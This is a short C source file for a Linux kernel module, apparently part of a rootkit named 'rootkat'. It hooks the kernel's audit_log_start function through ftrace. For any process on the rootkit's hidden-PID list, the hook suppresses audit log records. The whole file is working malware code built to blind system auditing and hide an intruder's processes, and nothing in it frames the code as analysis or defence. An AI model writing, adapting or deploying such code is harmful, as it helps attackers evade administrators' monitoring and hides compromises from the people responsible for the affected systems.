// SPDX-License-Identifier: MIT
#include <linux/audit.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/types.h>
#include "ftrace_hook.h"
#include "hidden_pids.h"
#include "hook_audit.h"

#define TAG "rootkat/hook_audit: "

static const char * const audit_log_start_candidates[] = {
	"audit_log_start", NULL,
};

typedef struct audit_buffer *(*audit_log_start_t)(struct audit_context *ctx,
                                                  gfp_t gfp_mask, int type);

static struct audit_buffer *rootkat_audit_log_start(struct audit_context *ctx,
                                                    gfp_t gfp_mask, int type);

static struct rootkat_hook hook_audit_log_start = {
	.candidates  = audit_log_start_candidates,
	.replacement = rootkat_audit_log_start,
};

static struct audit_buffer *rootkat_audit_log_start(struct audit_context *ctx,
                                                    gfp_t gfp_mask, int type)
{
	audit_log_start_t orig =
		(audit_log_start_t)hook_audit_log_start.original;

	if (rootkat_is_pid_hidden(task_pid_nr(current)))
		return NULL;

	return orig(ctx, gfp_mask, type);
}

int rootkat_hook_audit_log_start_install(void)
{
	return rootkat_hook_install(&hook_audit_log_start);
}

void rootkat_hook_audit_log_start_remove(void)
{
	rootkat_hook_remove(&hook_audit_log_start);
}
